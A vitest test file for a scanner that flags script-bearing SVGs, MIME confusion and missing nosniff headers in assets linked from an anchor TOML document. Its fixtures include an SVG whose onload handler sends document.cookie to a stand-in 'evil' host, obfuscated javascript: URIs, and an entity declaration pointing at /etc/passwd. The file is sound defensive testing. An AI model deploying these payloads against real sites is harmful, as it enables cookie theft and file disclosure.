import { describe, expect, it } from 'vitest';
import {
  MAX_SCAN_BYTES,
  MimeSecurityScanner,
  assetTargets,
  auditAssetSecurity,
  findSvgScriptVectors,
  isActiveContentType,
  mimeSecurityRuleIds,
  renderMimeReport,
} from '../src/security/mimeScanner.js';

const DOC = {
  DOCUMENTATION: {
    ORG_LOGO: 'https://anchor.example.com/logo.png',
    ORG_PHYSICAL_ADDRESS_ATTESTATION: 'https://anchor.example.com/docs/address.pdf',
  },
  CURRENCIES: [{ code: 'USD', image: 'https://anchor.example.com/usd.svg' }],
};

function served(
  body: string,
  contentType: string | null,
  options: { nosniff?: boolean; status?: number } = {},
): Response {
  const headers = new Headers();
  if (contentType !== null) headers.set('content-type', contentType);
  if (options.nosniff === true) headers.set('x-content-type-options', 'nosniff');
  return new Response(body, { status: options.status ?? 200, headers });
}

const cleanSvg =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12"><path d="M0 0h12v12z"/></svg>';

const weaponizedSvg =
  '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil/\'+document.cookie)">' +
  '<script>alert(1)</script><a xlink:href="javascript:alert(1)">go</a></svg>';

/** Headers-only answers for the png and pdf, whose bodies must never be buffered. */
const tidyFetch = (async (input: string | URL | Request) => {
  const url = new URL(String(input));
  if (url.pathname.endsWith('.svg')) return served(cleanSvg, 'image/svg+xml', { nosniff: true });
  if (url.pathname.endsWith('.pdf'))
    return served('%PDF-1.7', 'application/pdf', { nosniff: true });
  return served('PNG', 'image/png', { nosniff: true });
}) as unknown as typeof fetch;

const evilFetch = (async (input: string | URL | Request) => {
  const url = new URL(String(input));
  if (url.pathname.endsWith('.svg')) return served(weaponizedSvg, 'image/svg+xml');
  if (url.pathname.endsWith('.png')) return served('<html><script>1</script></html>', 'text/html');
  return served('%PDF-1.7', 'application/pdf');
}) as unknown as typeof fetch;

describe('findSvgScriptVectors', () => {
  it('reads a benign SVG as carrying no vectors', () => {
    expect(findSvgScriptVectors(cleanSvg)).toEqual([]);
  });

  it('finds script elements, event handlers and javascript: URLs', () => {
    const vectors = findSvgScriptVectors(weaponizedSvg);
    expect(vectors).toContain('script-element');
    expect(vectors).toContain('event-handler');
    expect(vectors).toContain('javascript-uri');
  });

  it('catches a tab and an encoded colon inside the scheme', () => {
    expect(findSvgScriptVectors('<a xlink:href="java\tscript:alert(1)">x</a>')).toContain(
      'javascript-uri',
    );
    expect(findSvgScriptVectors('<a href="javascript&#x3a;alert(1)">x</a>')).toContain(
      'javascript-uri',
    );
  });

  it('reports foreignObject, embedded documents and entity declarations', () => {
    expect(findSvgScriptVectors('<foreignObject><body/></foreignObject>')).toContain(
      'foreign-object',
    );
    expect(findSvgScriptVectors('<svg><iframe src="https://x"/></svg>')).toContain(
      'embedded-document',
    );
    expect(
      findSvgScriptVectors('<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>'),
    ).toContain('entity-declaration');
  });

  it('ignores markup inside a comment, exactly as a parser would', () => {
    expect(findSvgScriptVectors('<svg><!-- <script>alert(1)</script> --></svg>')).toEqual([]);
  });

  it('keeps markup after an abruptly closed comment visible to the scan', () => {
    // The tokenizer closes `<!-->` and `<!--->` where they open, so the script
    // that follows them executes. A search for the next `-->` would delete it.
    expect(findSvgScriptVectors('<svg><!--><script>alert(1)</script></svg>')).toEqual([
      'script-element',
    ]);
    expect(findSvgScriptVectors('<svg><!---><script>alert(1)</script></svg>')).toEqual([
      'script-element',
    ]);
    expect(findSvgScriptVectors('<svg><!-- -- <script>x</script> --></svg>')).toEqual([]);
    // An unterminated comment does run to the end of the document.
    expect(findSvgScriptVectors('<svg><!-- <script>alert(1)')).toEqual([]);
  });

  it('never expands an entity, so a billion-laughs payload stays inert text', () => {
    const bomb = '<!DOCTYPE a [<!ENTITY x SYSTEM "x">]><svg><text>&x;&x;&x;</text></svg>';
    expect(findSvgScriptVectors(bomb)).toEqual(['entity-declaration']);
  });
});

describe('isActiveContentType', () => {
  it('treats markup and script media types as executable', () => {
    for (const type of ['text/html', 'image/svg+xml', 'application/xhtml+xml', 'text/javascript']) {
      expect(isActiveContentType(type)).toBe(true);
    }
    for (const type of ['image/png', 'application/pdf', 'text/plain', 'application/json']) {
      expect(isActiveContentType(type)).toBe(false);
    }
  });
});

describe('assetTargets', () => {
  it('collects logos, images, attestations and linked toml files', () => {
    expect(assetTargets(DOC).map((target) => target.field)).toEqual([
      'DOCUMENTATION.ORG_LOGO',
      'DOCUMENTATION.ORG_PHYSICAL_ADDRESS_ATTESTATION',
      'CURRENCIES[0].image',
    ]);
    expect(assetTargets(DOC).map((target) => target.kind)).toEqual(['image', 'document', 'svg']);
  });

  it('skips fields that are not https URLs', () => {
    expect(assetTargets({ DOCUMENTATION: { ORG_LOGO: 'logo.png' } })).toEqual([]);
  });
});

describe('MimeSecurityScanner', () => {
  it('registers the MIME and SVG rule ids', () => {
    expect(mimeSecurityRuleIds).toEqual([
      'mime/asset-unreachable',
      'mime/missing-nosniff',
      'mime/active-content-type',
      'mime/content-type-mismatch',
      'svg/embedded-script',
      'svg/entity-declaration',
    ]);
  });

  it('passes assets that are typed, sniffed and inert', async () => {
    const { diagnostics, report } = await auditAssetSecurity(DOC, tidyFetch);
    expect(diagnostics).toEqual([]);
    expect(report.ok).toBe(true);
    expect(report.observations.map((entry) => entry.kind)).toEqual(['image', 'document', 'svg']);
  });

  it('does not buffer a binary payload', async () => {
    const read: number[] = [];
    const countingFetch = (async () => {
      let pulled = 0;
      return new Response(
        new ReadableStream<Uint8Array>({
          pull(controller) {
            pulled += 1;
            read.push(pulled);
            // 5 × 64 KiB: a scanner that drained the body would show all five.
            if (pulled >= 5) controller.close();
            else controller.enqueue(new Uint8Array(64 * 1024));
          },
        }),
        { status: 200, headers: { 'content-type': 'image/png' } },
      );
    }) as unknown as typeof fetch;
    const { report } = await auditAssetSecurity(
      { DOCUMENTATION: { ORG_LOGO: 'https://a.example/logo.png' } },
      countingFetch,
    );
    expect(report.observations[0]?.scanned).toBe(false);
    // The Response constructor itself pulls one chunk before any reader exists.
    expect(read.length).toBeLessThanOrEqual(1);
  });

  it('reports a weaponized SVG as an error and the missing nosniff as a warning', async () => {
    const { diagnostics } = await auditAssetSecurity(DOC, evilFetch);
    const at = (rule: string, field: string) =>
      diagnostics.find((entry) => entry.rule === rule && entry.path === field);
    const script = at('svg/embedded-script', 'CURRENCIES[0].image');
    expect(script?.severity).toBe('error');
    expect(script?.message).toContain('script-element');
    expect(script?.message).toContain('event-handler');
    expect(script?.message).toContain('javascript-uri');
    const nosniff = diagnostics.find((entry) => entry.rule === 'mime/missing-nosniff');
    expect(nosniff?.severity).toBe('warning');
    expect(nosniff?.path).toBe('DOCUMENTATION.ORG_LOGO');
  });

  it('catches MIME confusion: a png link answered as HTML', async () => {
    const { diagnostics } = await auditAssetSecurity(DOC, evilFetch);
    const rules = diagnostics.map((diagnostic) => diagnostic.rule);
    expect(rules).toContain('mime/active-content-type');
    expect(rules).toContain('mime/content-type-mismatch');
    const mismatch = diagnostics.find((entry) => entry.rule === 'mime/content-type-mismatch');
    expect(mismatch?.message).toContain('image/png');
    expect(mismatch?.message).toContain('text/html');
  });

  it('holds an svg link to the same rule when the host answers it as HTML', async () => {
    const { diagnostics } = await auditAssetSecurity(
      { CURRENCIES: [{ image: 'https://a.example/usd.svg' }] },
      (async () =>
        served('<html><script>1</script></html>', 'text/html')) as unknown as typeof fetch,
    );
    const rules = diagnostics.map((entry) => entry.rule);
    expect(rules).toContain('mime/active-content-type');
    expect(rules).toContain('mime/content-type-mismatch');
  });

  it('bounds the scan and says so in the finding', async () => {
    const huge = `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>${'<rect width="1" height="1"/>'.repeat(
      5000,
    )}</svg>`;
    const hugeFetch = (async () =>
      served(huge, 'image/svg+xml', { nosniff: true })) as unknown as typeof fetch;
    const report = await new MimeSecurityScanner(hugeFetch, {
      maxScanBytes: 4096,
    }).audit({ CURRENCIES: [{ image: 'https://a.example/icon.svg' }] });
    expect(report.observations[0]?.truncated).toBe(true);
    expect(report.findings.map((finding) => finding.code)).toContain('svg/embedded-script');
    expect(report.findings[0]?.message).toContain('first 4096 bytes scanned');
    expect(MAX_SCAN_BYTES).toBe(256 * 1024);
  });

  it('warns about unreachable and erroring assets without reading them', async () => {
    const downFetch = (async (input: string | URL | Request) => {
      const url = new URL(String(input));
      if (url.pathname.endsWith('.pdf')) return served('', null, { status: 404 });
      throw new Error('socket hang up');
    }) as unknown as typeof fetch;
    const { diagnostics } = await auditAssetSecurity(DOC, downFetch);
    const unreachable = diagnostics.filter((entry) => entry.rule === 'mime/asset-unreachable');
    expect(unreachable.map((entry) => entry.path)).toEqual([
      'DOCUMENTATION.ORG_LOGO',
      'DOCUMENTATION.ORG_PHYSICAL_ADDRESS_ATTESTATION',
      'CURRENCIES[0].image',
    ]);
    expect(unreachable[1]?.message).toContain('HTTP 404');
  });

  it('honours a severity override and an off switch', async () => {
    const overridden = await auditAssetSecurity(DOC, evilFetch, {
      rules: { 'svg/embedded-script': 'off', 'mime/missing-nosniff': 'error' },
    });
    const rules = overridden.diagnostics.map((diagnostic) => diagnostic.rule);
    expect(rules).not.toContain('svg/embedded-script');
    expect(rules).toContain('mime/missing-nosniff');
    expect(
      overridden.diagnostics.find((diagnostic) => diagnostic.rule === 'mime/missing-nosniff')
        ?.severity,
    ).toBe('error');
    expect(
      overridden.diagnostics.find((diagnostic) => diagnostic.rule === 'mime/content-type-mismatch')
        ?.severity,
    ).toBe('warning');

    const silenced = await auditAssetSecurity(DOC, evilFetch, {
      rules: {
        'mime/missing-nosniff': 'off',
        'mime/active-content-type': 'off',
        'mime/content-type-mismatch': 'off',
        'svg/entity-declaration': 'off',
      },
    });
    expect(silenced.diagnostics.map((diagnostic) => diagnostic.rule)).toEqual([
      'svg/embedded-script',
      'svg/embedded-script',
    ]);
    expect(silenced.report.ok).toBe(false);
  });

  it('names HTML served at an image link as executable markup too', async () => {
    const { diagnostics } = await auditAssetSecurity(DOC, evilFetch);
    const asHtml = diagnostics.filter((entry) => entry.path === 'DOCUMENTATION.ORG_LOGO');
    expect(asHtml.map((entry) => entry.rule).sort()).toEqual(
      [
        'mime/active-content-type',
        'mime/content-type-mismatch',
        'mime/missing-nosniff',
        'svg/embedded-script',
      ].sort(),
    );
  });

  it('renders one line per asset plus the fixes', async () => {
    const { report } = await auditAssetSecurity(DOC, tidyFetch);
    const rendered = renderMimeReport(report);
    expect(rendered).toContain('assets: 3');
    expect(rendered).toContain('DOCUMENTATION.ORG_LOGO (image)');
    expect(rendered).toContain('vectors=none');
    expect(rendered).toContain('Every linked asset was typed, sniffed and scanned');
  });
});
